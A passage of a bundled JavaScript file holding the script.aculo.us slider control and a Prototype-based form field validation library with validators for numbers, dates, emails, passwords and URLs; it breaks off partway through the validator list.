// script.aculo.us slider.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Marty Haught, Thomas Fuchs
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

if (!Control) var Control = { };

// options:
//  axis: 'vertical', or 'horizontal' (default)
//
// callbacks:
//  onChange(value)
//  onSlide(value)
Control.Slider = Class.create({
  initialize: function(handle, track, options) {
    var slider = this;

    if (Object.isArray(handle)) {
      this.handles = handle.collect( function(e) { return $(e) });
    } else {
      this.handles = [$(handle)];
    }

    this.track   = $(track);
    this.options = options || { };

    this.axis      = this.options.axis || 'horizontal';
    this.increment = this.options.increment || 1;
    this.step      = parseInt(this.options.step || '1');
    this.range     = this.options.range || $R(0,1);

    this.value     = 0; // assure backwards compat
    this.values    = this.handles.map( function() { return 0 });
    this.spans     = this.options.spans ? this.options.spans.map(function(s){ return $(s) }) : false;
    this.options.startSpan = $(this.options.startSpan || null);
    this.options.endSpan   = $(this.options.endSpan || null);

    this.restricted = this.options.restricted || false;

    this.maximum   = this.options.maximum || this.range.end;
    this.minimum   = this.options.minimum || this.range.start;

    // Will be used to align the handle onto the track, if necessary
    this.alignX = parseInt(this.options.alignX || '0');
    this.alignY = parseInt(this.options.alignY || '0');

    this.trackLength = this.maximumOffset() - this.minimumOffset();

    this.handleLength = this.isVertical() ?
      (this.handles[0].offsetHeight != 0 ?
        this.handles[0].offsetHeight : this.handles[0].style.height.replace(/px$/,"")) :
      (this.handles[0].offsetWidth != 0 ? this.handles[0].offsetWidth :
        this.handles[0].style.width.replace(/px$/,""));

    this.active   = false;
    this.dragging = false;
    this.disabled = false;

    if (this.options.disabled) this.setDisabled();

    // Allowed values array
    this.allowedValues = this.options.values ? this.options.values.sortBy(Prototype.K) : false;
    if (this.allowedValues) {
      this.minimum = this.allowedValues.min();
      this.maximum = this.allowedValues.max();
    }

    this.eventMouseDown = this.startDrag.bindAsEventListener(this);
    this.eventMouseUp   = this.endDrag.bindAsEventListener(this);
    this.eventMouseMove = this.update.bindAsEventListener(this);

    // Initialize handles in reverse (make sure first handle is active)
    this.handles.each( function(h,i) {
      i = slider.handles.length-1-i;
      slider.setValue(parseFloat(
        (Object.isArray(slider.options.sliderValue) ?
          slider.options.sliderValue[i] : slider.options.sliderValue) ||
         slider.range.start), i);
      h.makePositioned().observe("mousedown", slider.eventMouseDown);
    });

    this.track.observe("mousedown", this.eventMouseDown);
    document.observe("mouseup", this.eventMouseUp);
    $(this.track.parentNode.parentNode).observe("mousemove", this.eventMouseMove);


    this.initialized = true;
  },
  dispose: function() {
    var slider = this;
    Event.stopObserving(this.track, "mousedown", this.eventMouseDown);
    Event.stopObserving(document, "mouseup", this.eventMouseUp);
    Event.stopObserving(this.track.parentNode.parentNode, "mousemove", this.eventMouseMove);
    this.handles.each( function(h) {
      Event.stopObserving(h, "mousedown", slider.eventMouseDown);
    });
  },
  setDisabled: function(){
    this.disabled = true;
    this.track.parentNode.className = this.track.parentNode.className + ' disabled';
  },
  setEnabled: function(){
    this.disabled = false;
  },
  getNearestValue: function(value){
    if (this.allowedValues){
      if (value >= this.allowedValues.max()) return(this.allowedValues.max());
      if (value <= this.allowedValues.min()) return(this.allowedValues.min());

      var offset = Math.abs(this.allowedValues[0] - value);
      var newValue = this.allowedValues[0];
      this.allowedValues.each( function(v) {
        var currentOffset = Math.abs(v - value);
        if (currentOffset <= offset){
          newValue = v;
          offset = currentOffset;
        }
      });
      return newValue;
    }
    if (value > this.range.end) return this.range.end;
    if (value < this.range.start) return this.range.start;
    return value;
  },
  setValue: function(sliderValue, handleIdx){
    if (!this.active) {
      this.activeHandleIdx = handleIdx || 0;
      this.activeHandle    = this.handles[this.activeHandleIdx];
      this.updateStyles();
    }
    handleIdx = handleIdx || this.activeHandleIdx || 0;
    if (this.initialized && this.restricted) {
      if ((handleIdx>0) && (sliderValue<this.values[handleIdx-1]))
        sliderValue = this.values[handleIdx-1];
      if ((handleIdx < (this.handles.length-1)) && (sliderValue>this.values[handleIdx+1]))
        sliderValue = this.values[handleIdx+1];
    }
    sliderValue = this.getNearestValue(sliderValue);
    this.values[handleIdx] = sliderValue;
    this.value = this.values[0]; // assure backwards compat

    this.handles[handleIdx].style[this.isVertical() ? 'top' : 'left'] =
      this.translateToPx(sliderValue);

    this.drawSpans();
    if (!this.dragging || !this.event) this.updateFinished();
  },
  setValueBy: function(delta, handleIdx) {
    this.setValue(this.values[handleIdx || this.activeHandleIdx || 0] + delta,
      handleIdx || this.activeHandleIdx || 0);
  },
  translateToPx: function(value) {
    return Math.round(
      ((this.trackLength-this.handleLength)/(this.range.end-this.range.start)) *
      (value - this.range.start)) + "px";
  },
  translateToValue: function(offset) {
    return ((offset/(this.trackLength-this.handleLength) *
      (this.range.end-this.range.start)) + this.range.start);
  },
  getRange: function(range) {
    var v = this.values.sortBy(Prototype.K);
    range = range || 0;
    return $R(v[range],v[range+1]);
  },
  minimumOffset: function(){
    return(this.isVertical() ? this.alignY : this.alignX);
  },
  maximumOffset: function(){
    return(this.isVertical() ?
      (this.track.offsetHeight != 0 ? this.track.offsetHeight :
        this.track.style.height.replace(/px$/,"")) - this.alignY :
      (this.track.offsetWidth != 0 ? this.track.offsetWidth :
        this.track.style.width.replace(/px$/,"")) - this.alignX);
  },
  isVertical:  function(){
    return (this.axis == 'vertical');
  },
  drawSpans: function() {
    var slider = this;
    if (this.spans)
      $R(0, this.spans.length-1).each(function(r) { slider.setSpan(slider.spans[r], slider.getRange(r)) });
    if (this.options.startSpan)
      this.setSpan(this.options.startSpan,
        $R(0, this.values.length>1 ? this.getRange(0).min() : this.value ));
    if (this.options.endSpan)
      this.setSpan(this.options.endSpan,
        $R(this.values.length>1 ? this.getRange(this.spans.length-1).max() : this.value, this.maximum));
  },
  setSpan: function(span, range) {
    if (this.isVertical()) {
      span.style.top = this.translateToPx(range.start);
      span.style.height = this.translateToPx(range.end - range.start + this.range.start);
    } else {
      span.style.left = this.translateToPx(range.start);
      span.style.width = this.translateToPx(range.end - range.start + this.range.start);
    }
  },
  updateStyles: function() {
    this.handles.each( function(h){ Element.removeClassName(h, 'selected') });
    Element.addClassName(this.activeHandle, 'selected');
  },
  startDrag: function(event) {
    if (Event.isLeftClick(event)) {
      if (!this.disabled){
        this.active = true;

        var handle = Event.element(event);
        var pointer  = [Event.pointerX(event), Event.pointerY(event)];
        var track = handle;
        if (track==this.track) {
          var offsets  = Position.cumulativeOffset(this.track);
          this.event = event;
          this.setValue(this.translateToValue(
           (this.isVertical() ? pointer[1]-offsets[1] : pointer[0]-offsets[0])-(this.handleLength/2)
          ));
          var offsets  = Position.cumulativeOffset(this.activeHandle);
          this.offsetX = (pointer[0] - offsets[0]);
          this.offsetY = (pointer[1] - offsets[1]);
        } else {
          // find the handle (prevents issues with Safari)
          while((this.handles.indexOf(handle) == -1) && handle.parentNode)
            handle = handle.parentNode;

          if (this.handles.indexOf(handle)!=-1) {
            this.activeHandle    = handle;
            this.activeHandleIdx = this.handles.indexOf(this.activeHandle);
            this.updateStyles();

            var offsets  = Position.cumulativeOffset(this.activeHandle);
            this.offsetX = (pointer[0] - offsets[0]);
            this.offsetY = (pointer[1] - offsets[1]);
          }
        }
      }
      Event.stop(event);
    }
  },
  update: function(event) {
   if (this.active) {
      if (!this.dragging) this.dragging = true;
      this.draw(event);
      if (Prototype.Browser.WebKit) window.scrollBy(0,0);
      Event.stop(event);
   }
  },
  draw: function(event) {
    var pointer = [Event.pointerX(event), Event.pointerY(event)];
    var offsets = Position.cumulativeOffset(this.track);
    pointer[0] -= this.offsetX + offsets[0];
    pointer[1] -= this.offsetY + offsets[1];
    this.event = event;
    this.setValue(this.translateToValue( this.isVertical() ? pointer[1] : pointer[0] ));
    if (this.initialized && this.options.onSlide)
      this.options.onSlide(this.values.length>1 ? this.values : this.value, this);
  },
  endDrag: function(event) {
    if (this.active && this.dragging) {
      this.finishDrag(event, true);
      Event.stop(event);
    }
    this.active = false;
    this.dragging = false;
  },
  finishDrag: function(event, success) {
    this.active = false;
    this.dragging = false;
    this.updateFinished();
  },
  updateFinished: function() {
    if (this.initialized && this.options.onChange)
      this.options.onChange(this.values.length>1 ? this.values : this.value, this);
    this.event = null;
  }
});
/*
* Really easy field validation with Prototype
* http://tetlaw.id.au/view/javascript/really-easy-field-validation
* Andrew Tetlaw
* Version 1.5.4.1 (2007-01-05)
*
* Copyright (c) 2007 Andrew Tetlaw
* Permission is hereby granted, free of charge, to any person
* obtaining a copy of this software and associated documentation
* files (the "Software"), to deal in the Software without
* restriction, including without limitation the rights to use, copy,
* modify, merge, publish, distribute, sublicense, and/or sell copies
* of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be
* included in all copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
* EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
* MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
* NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
* BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
* ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
* CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*
*/
var Validator = Class.create();

Validator.prototype = {
    initialize : function(className, error, test, options) {
        if(typeof test == 'function'){
            this.options = $H(options);
            this._test = test;
        } else {
            this.options = $H(test);
            this._test = function(){return true};
        }
        this.error = error || 'Validation failed.';
        this.className = className;
    },
    test : function(v, elm) {
        return (this._test(v,elm) && this.options.all(function(p){
            return Validator.methods[p.key] ? Validator.methods[p.key](v,elm,p.value) : true;
        }));
    }
}
Validator.methods = {
    pattern : function(v,elm,opt) {return Validation.get('IsEmpty').test(v) || opt.test(v)},
    minLength : function(v,elm,opt) {return v.length >= opt},
    maxLength : function(v,elm,opt) {return v.length <= opt},
    min : function(v,elm,opt) {return v >= parseFloat(opt)},
    max : function(v,elm,opt) {return v <= parseFloat(opt)},
    notOneOf : function(v,elm,opt) {return $A(opt).all(function(value) {
        return v != value;
    })},
    oneOf : function(v,elm,opt) {return $A(opt).any(function(value) {
        return v == value;
    })},
    is : function(v,elm,opt) {return v == opt},
    isNot : function(v,elm,opt) {return v != opt},
    equalToField : function(v,elm,opt) {return v == $F(opt)},
    notEqualToField : function(v,elm,opt) {return v != $F(opt)},
    include : function(v,elm,opt) {return $A(opt).all(function(value) {
        return Validation.get(value).test(v,elm);
    })}
}

var Validation = Class.create();
Validation.defaultOptions = {
    onSubmit : true,
    stopOnFirst : false,
    immediate : false,
    focusOnError : true,
    useTitles : false,
    addClassNameToContainer: false,
    containerClassName: '.input-box',
    onFormValidate : function(result, form) {},
    onElementValidate : function(result, elm) {}
};

Validation.prototype = {
    initialize : function(form, options){
        this.form = $(form);
        if (!this.form) {
            return;
        }
        this.options = Object.extend({
            onSubmit : Validation.defaultOptions.onSubmit,
            stopOnFirst : Validation.defaultOptions.stopOnFirst,
            immediate : Validation.defaultOptions.immediate,
            focusOnError : Validation.defaultOptions.focusOnError,
            useTitles : Validation.defaultOptions.useTitles,
            onFormValidate : Validation.defaultOptions.onFormValidate,
            onElementValidate : Validation.defaultOptions.onElementValidate
        }, options || {});
        if(this.options.onSubmit) Event.observe(this.form,'submit',this.onSubmit.bind(this),false);
        if(this.options.immediate) {
            Form.getElements(this.form).each(function(input) { // Thanks Mike!
                if (input.tagName.toLowerCase() == 'select') {
                    Event.observe(input, 'blur', this.onChange.bindAsEventListener(this));
                }
                if (input.type.toLowerCase() == 'radio' || input.type.toLowerCase() == 'checkbox') {
                    Event.observe(input, 'click', this.onChange.bindAsEventListener(this));
                } else {
                    Event.observe(input, 'change', this.onChange.bindAsEventListener(this));
                }
            }, this);
        }
    },
    onChange : function (ev) {
        Validation.isOnChange = true;
        Validation.validate(Event.element(ev),{
                useTitle : this.options.useTitles,
                onElementValidate : this.options.onElementValidate
        });
        Validation.isOnChange = false;
    },
    onSubmit :  function(ev){
        if(!this.validate()) Event.stop(ev);
    },
    validate : function() {
        var result = false;
        var useTitles = this.options.useTitles;
        var callback = this.options.onElementValidate;
        try {
            if(this.options.stopOnFirst) {
                result = Form.getElements(this.form).all(function(elm) {
                    if (elm.hasClassName('local-validation') && !this.isElementInForm(elm, this.form)) {
                        return true;
                    }
                    return Validation.validate(elm,{useTitle : useTitles, onElementValidate : callback});
                }, this);
            } else {
                result = Form.getElements(this.form).collect(function(elm) {
                    if (elm.hasClassName('local-validation') && !this.isElementInForm(elm, this.form)) {
                        return true;
                    }
                    return Validation.validate(elm,{useTitle : useTitles, onElementValidate : callback});
                }, this).all();
            }
        } catch (e) {
        }
        if(!result && this.options.focusOnError) {
            try{
                Form.getElements(this.form).findAll(function(elm){return $(elm).hasClassName('validation-failed')}).first().focus()
            }
            catch(e){
            }
        }
        this.options.onFormValidate(result, this.form);
        return result;
    },
    reset : function() {
        Form.getElements(this.form).each(Validation.reset);
    },
    isElementInForm : function(elm, form) {
        var domForm = elm.up('form');
        if (domForm == form) {
            return true;
        }
        return false;
    }
}

Object.extend(Validation, {
    validate : function(elm, options){
        options = Object.extend({
            useTitle : false,
            onElementValidate : function(result, elm) {}
        }, options || {});
        elm = $(elm);

        var cn = $w(elm.className);
        return result = cn.all(function(value) {
            var test = Validation.test(value,elm,options.useTitle);
            options.onElementValidate(test, elm);
            return test;
        });
    },
    insertAdvice : function(elm, advice){
        var container = $(elm).up('.field-row');
        if(container){
            Element.insert(container, {after: advice});
        } else if (elm.up('td.value')) {
            elm.up('td.value').insert({bottom: advice});
        } else if (elm.advaiceContainer && $(elm.advaiceContainer)) {
            $(elm.advaiceContainer).update(advice);
        }
        else {
            switch (elm.type.toLowerCase()) {
                case 'checkbox':
                case 'radio':
                    var p = elm.parentNode;
                    if(p) {
                        Element.insert(p, {'bottom': advice});
                    } else {
                        Element.insert(elm, {'after': advice});
                    }
                    break;
                default:
                    Element.insert(elm, {'after': advice});
            }
        }
    },
    showAdvice : function(elm, advice, adviceName){
        if(!elm.advices){
            elm.advices = new Hash();
        }
        else{
            elm.advices.each(function(pair){
                if (!advice || pair.value.id != advice.id) {
                    // hide non-current advice after delay
                    this.hideAdvice(elm, pair.value);
                }
            }.bind(this));
        }
        elm.advices.set(adviceName, advice);
        if(typeof Effect == 'undefined') {
            advice.style.display = 'block';
        } else {
            if(!advice._adviceAbsolutize) {
                new Effect.Appear(advice, {duration : 1 });
            } else {
                Position.absolutize(advice);
                advice.show();
                advice.setStyle({
                    'top':advice._adviceTop,
                    'left': advice._adviceLeft,
                    'width': advice._adviceWidth,
                    'z-index': 1000
                });
                advice.addClassName('advice-absolute');
            }
        }
    },
    hideAdvice : function(elm, advice){
        if (advice != null) {
            new Effect.Fade(advice, {duration : 1, afterFinishInternal : function() {advice.hide();}});
        }
    },
    updateCallback : function(elm, status) {
        if (typeof elm.callbackFunction != 'undefined') {
            eval(elm.callbackFunction+'(\''+elm.id+'\',\''+status+'\')');
        }
    },
    ajaxError : function(elm, errorMsg) {
        var name = 'validate-ajax';
        var advice = Validation.getAdvice(name, elm);
        if (advice == null) {
            advice = this.createAdvice(name, elm, false, errorMsg);
        }
        this.showAdvice(elm, advice, 'validate-ajax');
        this.updateCallback(elm, 'failed');

        elm.addClassName('validation-failed');
        elm.addClassName('validate-ajax');
        if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
            var container = elm.up(Validation.defaultOptions.containerClassName);
            if (container && this.allowContainerClassName(elm)) {
                container.removeClassName('validation-passed');
                container.addClassName('validation-error');
            }
        }
    },
    allowContainerClassName: function (elm) {
        if (elm.type == 'radio' || elm.type == 'checkbox') {
            return elm.hasClassName('change-container-classname');
        }

        return true;
    },
    test : function(name, elm, useTitle) {
        var v = Validation.get(name);
        var prop = '__advice'+name.camelize();
        try {
        if(Validation.isVisible(elm) && !v.test($F(elm), elm)) {
            //if(!elm[prop]) {
                var advice = Validation.getAdvice(name, elm);
                if (advice == null) {
                    advice = this.createAdvice(name, elm, useTitle);
                }
                this.showAdvice(elm, advice, name);
                this.updateCallback(elm, 'failed');
            //}
            elm[prop] = 1;
            if (!elm.advaiceContainer) {
                elm.removeClassName('validation-passed');
                elm.addClassName('validation-failed');
            }

           if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
                var container = elm.up(Validation.defaultOptions.containerClassName);
                if (container && this.allowContainerClassName(elm)) {
                    container.removeClassName('validation-passed');
                    container.addClassName('validation-error');
                }
            }
            return false;
        } else {
            var advice = Validation.getAdvice(name, elm);
            this.hideAdvice(elm, advice);
            this.updateCallback(elm, 'passed');
            elm[prop] = '';
            elm.removeClassName('validation-failed');
            elm.addClassName('validation-passed');
            if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
                var container = elm.up(Validation.defaultOptions.containerClassName);
                if (container && !container.down('.validation-failed') && this.allowContainerClassName(elm)) {
                    if (!Validation.get('IsEmpty').test(elm.value) || !this.isVisible(elm)) {
                        container.addClassName('validation-passed');
                    } else {
                        container.removeClassName('validation-passed');
                    }
                    container.removeClassName('validation-error');
                }
            }
            return true;
        }
        } catch(e) {
            throw(e)
        }
    },
    isVisible : function(elm) {
        while(elm.tagName != 'BODY') {
            if(!$(elm).visible()) return false;
            elm = elm.parentNode;
        }
        return true;
    },
    getAdvice : function(name, elm) {
        return $('advice-' + name + '-' + Validation.getElmID(elm)) || $('advice-' + Validation.getElmID(elm));
    },
    createAdvice : function(name, elm, useTitle, customError) {
        var v = Validation.get(name);
        var errorMsg = useTitle ? ((elm && elm.title) ? elm.title : v.error) : v.error;
        if (customError) {
            errorMsg = customError;
        }
        try {
            if (Translator){
                errorMsg = Translator.translate(errorMsg);
            }
        }
        catch(e){}

        advice = '<div class="validation-advice" id="advice-' + name + '-' + Validation.getElmID(elm) +'" style="display:none">' + errorMsg + '</div>'


        Validation.insertAdvice(elm, advice);
        advice = Validation.getAdvice(name, elm);
        if($(elm).hasClassName('absolute-advice')) {
            var dimensions = $(elm).getDimensions();
            var originalPosition = Position.cumulativeOffset(elm);

            advice._adviceTop = (originalPosition[1] + dimensions.height) + 'px';
            advice._adviceLeft = (originalPosition[0])  + 'px';
            advice._adviceWidth = (dimensions.width)  + 'px';
            advice._adviceAbsolutize = true;
        }
        return advice;
    },
    getElmID : function(elm) {
        return elm.id ? elm.id : elm.name;
    },
    reset : function(elm) {
        elm = $(elm);
        var cn = $w(elm.className);
        cn.each(function(value) {
            var prop = '__advice'+value.camelize();
            if(elm[prop]) {
                var advice = Validation.getAdvice(value, elm);
                if (advice) {
                    advice.hide();
                }
                elm[prop] = '';
            }
            elm.removeClassName('validation-failed');
            elm.removeClassName('validation-passed');
            if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
                var container = elm.up(Validation.defaultOptions.containerClassName);
                if (container) {
                    container.removeClassName('validation-passed');
                    container.removeClassName('validation-error');
                }
            }
        });
    },
    add : function(className, error, test, options) {
        var nv = {};
        nv[className] = new Validator(className, error, test, options);
        Object.extend(Validation.methods, nv);
    },
    addAllThese : function(validators) {
        var nv = {};
        $A(validators).each(function(value) {
                nv[value[0]] = new Validator(value[0], value[1], value[2], (value.length > 3 ? value[3] : {}));
            });
        Object.extend(Validation.methods, nv);
    },
    get : function(name) {
        return  Validation.methods[name] ? Validation.methods[name] : Validation.methods['_LikeNoIDIEverSaw_'];
    },
    methods : {
        '_LikeNoIDIEverSaw_' : new Validator('_LikeNoIDIEverSaw_','',{})
    }
});

Validation.add('IsEmpty', '', function(v) {
    return  (v == '' || (v == null) || (v.length == 0) || /^\s+$/.test(v));
});

Validation.addAllThese([
    ['validate-no-html-tags', 'HTML tags are not allowed', function(v) {
				return !/<(\/)?\w+/.test(v);
			}],
	['validate-select', 'Please select an option.', function(v) {
                return ((v != "none") && (v != null) && (v.length != 0));
            }],
    ['required-entry', 'This is a required field.', function(v) {
                return !Validation.get('IsEmpty').test(v);
            }],
    ['validate-number', 'Please enter a valid number in this field.', function(v) {
                return Validation.get('IsEmpty').test(v)
                    || (!isNaN(parseNumber(v)) && /^\s*-?\d*(\.\d*)?\s*$/.test(v));
            }],
    ['validate-number-range', 'The value is not within the specified range.', function(v, elm) {
                if (Validation.get('IsEmpty').test(v)) {
                    return true;
                }

                var numValue = parseNumber(v);
                if (isNaN(numValue)) {
                    return false;
                }

                var reRange = /^number-range-(-?[\d.,]+)?-(-?[\d.,]+)?$/,
                    result = true;

                $w(elm.className).each(function(name) {
                    var m = reRange.exec(name);
                    if (m) {
                        result = result
                            && (m[1] == null || m[1] == '' || numValue >= parseNumber(m[1]))
                            && (m[2] == null || m[2] == '' || numValue <= parseNumber(m[2]));
                    }
                });

                return result;
            }],
    ['validate-digits', 'Please use numbers only in this field. Please avoid spaces or other characters such as dots or commas.', function(v) {
                return Validation.get('IsEmpty').test(v) ||  !/[^\d]/.test(v);
            }],
    ['validate-digits-range', 'The value is not within the specified range.', function(v, elm) {
                if (Validation.get('IsEmpty').test(v)) {
                    return true;
                }

                var numValue = parseNumber(v);
                if (isNaN(numValue)) {
                    return false;
                }

                var reRange = /^digits-range-(-?\d+)?-(-?\d+)?$/,
                    result = true;

                $w(elm.className).each(function(name) {
                    var m = reRange.exec(name);
                    if (m) {
                        result = result
                            && (m[1] == null || m[1] == '' || numValue >= parseNumber(m[1]))
                            && (m[2] == null || m[2] == '' || numValue <= parseNumber(m[2]));
                    }
                });

                return result;
            }],
    ['validate-alpha', 'Please use letters only (a-z or A-Z) in this field.', function (v) {
                return Validation.get('IsEmpty').test(v) ||  /^[a-zA-Z]+$/.test(v)
            }],
    ['validate-code', 'Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.', function (v) {
                return Validation.get('IsEmpty').test(v) ||  /^[a-z]+[a-z0-9_]+$/.test(v)
            }],
    ['validate-alphanum', 'Please use only letters (a-z or A-Z) or numbers (0-9) only in this field. No spaces or other characters are allowed.', function(v) {
                return Validation.get('IsEmpty').test(v) || /^[a-zA-Z0-9]+$/.test(v)
            }],
    ['validate-alphanum-with-spaces', 'Please use only letters (a-z or A-Z), numbers (0-9) or spaces only in this field.', function(v) {
                    return Validation.get('IsEmpty').test(v) || /^[a-zA-Z0-9 ]+$/.test(v)
            }],
    ['validate-street', 'Please use only letters (a-z or A-Z) or numbers (0-9) or spaces and # only in this field.', function(v) {
                return Validation.get('IsEmpty').test(v) ||  /^[ \w]{3,}([A-Za-z]\.)?([ \w]*\#\d+)?(\r\n| )[ \w]{3,}/.test(v)
            }],
    ['validate-phoneStrict', 'Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.', function(v) {
                return Validation.get('IsEmpty').test(v) || /^(\()?\d{3}(\))?(-|\s)?\d{3}(-|\s)\d{4}$/.test(v);
            }],
    ['validate-phoneLax', 'Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.', function(v) {
                return Validation.get('IsEmpty').test(v) || /^((\d[-. ]?)?((\(\d{3}\))|\d{3}))?[-. ]?\d{3}[-. ]?\d{4}$/.test(v);
            }],
    ['validate-fax', 'Please enter a valid fax number. For example (123) 456-7890 or 123-456-7890.', function(v) {
                return Validation.get('IsEmpty').test(v) || /^(\()?\d{3}(\))?(-|\s)?\d{3}(-|\s)\d{4}$/.test(v);
            }],
    ['validate-date', 'Please enter a valid date.', function(v) {
                var test = new Date(v);
                return Validation.get('IsEmpty').test(v) || !isNaN(test);
            }],
    ['validate-date-range', 'The From Date value should be less than or equal to the To Date value.', function(v, elm) {
            var m = /\bdate-range-(\w+)-(\w+)\b/.exec(elm.className);
            if (!m || m[2] == 'to' || Validation.get('IsEmpty').test(v)) {
                return true;
            }

            var currentYear = new Date().getFullYear() + '';
            var normalizedTime = function(v) {
                v = v.split(/[.\/]/);
                if (v[2] && v[2].length < 4) {
                    v[2] = currentYear.substr(0, v[2].length) + v[2];
                }
                return new Date(v.join('/')).getTime();
            };

            var dependentElements = Element.select(elm.form, '.validate-date-range.date-range-' + m[1] + '-to');
            return !dependentElements.length || Validation.get('IsEmpty').test(dependentElements[0].value)
                || normalizedTime(v) <= normalizedTime(dependentElements[0].value);
        }],
    ['validate-email', 'Please enter a valid email address. For example johndoe@domain.com.', function (v) {
                //return Validation.get('IsEmpty').test(v) || /\w{1,}[@][\w\-]{1,}([.]([\w\-]{1,})){1,3}$/.test(v)
                //return Validation.get('IsEmpty').test(v) || /^[\!\#$%\*/?|\^\{\}`~&\'\+\-=_a-z0-9][\!\#$%\*/?|\^\{\}`~&\'\+\-=_a-z0-9\.]{1,30}[\!\#$%\*/?|\^\{\}`~&\'\+\-=_a-z0-9]@([a-z0-9_-]{1,30}\.){1,5}[a-z]{2,4}$/i.test(v)
                return Validation.get('IsEmpty').test(v) || /^([a-z0-9,!\#\$%&'\*\+\/=\?\^_`\{\|\}~-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z0-9,!\#\$%&'\*\+\/=\?\^_`\{\|\}~-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*@([a-z0-9-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z0-9-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*\.(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]){2,})$/i.test(v)
            }],
    ['validate-emailSender', 'Please use only visible characters and spaces.', function (v) {
                return Validation.get('IsEmpty').test(v) ||  /^[\S ]+$/.test(v)
                    }],
    ['validate-password', 'Please enter 6 or more characters. Leading or trailing spaces will be ignored.', function(v) {
                var pass=v.strip(); /*strip leading and trailing spaces*/
                return !(pass.length>0 && pass.length < 6);
            }],
    ['validate-admin-password', 'Please enter 7 or more characters. Password should contain both numeric and alphabetic characters.', function(v) {
                var pass=v.strip();
                if (0 == pass.length) {
                    return true;
                }
                if (!(/[a-z]/i.test(v)) || !(/[0-9]/.test(v))) {
                    return false;
                }
                return !(pass.length < 7);
            }],
    ['validate-cpassword', 'Please make sure your passwords match.', function(v) {
                var conf = $('confirmation') ? $('confirmation') : $$('.validate-cpassword')[0];
                var pass = false;
                if ($('password')) {
                    pass = $('password');
                }
                var passwordElements = $$('.validate-password');
                for (var i = 0; i < passwordElements.size(); i++) {
                    var passwordElement = passwordElements[i];
                    if (passwordElement.up('form').id == conf.up('form').id) {
                        pass = passwordElement;
                    }
                }
                if ($$('.validate-admin-password').size()) {
                    pass = $$('.validate-admin-password')[0];
                }
                return (pass.value == conf.value);
            }],
    ['validate-both-passwords', 'Please make sure your passwords match.', function(v, input) {
                var dependentInput = $(input.form[input.name == 'password' ? 'confirmation' : 'password']),
                    isEqualValues  = input.value == dependentInput.value;

                if (isEqualValues && dependentInput.hasClassName('validation-failed')) {
                    Validation.test(this.className, dependentInput);
                }

                return dependentInput.value == '' || isEqualValues;
            }],
    ['validate-url', 'Please enter a valid URL. Protocol is required (http://, https:// or ftp://)', function (v) {
                v = (v || '').replace(/^\s+/, '').replace(/\s+$/, '');
                return Validation.get('IsEmpty').test(v) || /^(https?|ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(\#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i.test(v)
            }],
    ['validate-clean-url', 'Please enter a valid URL. For example http://www.example.com or www.example.com', function (v) {
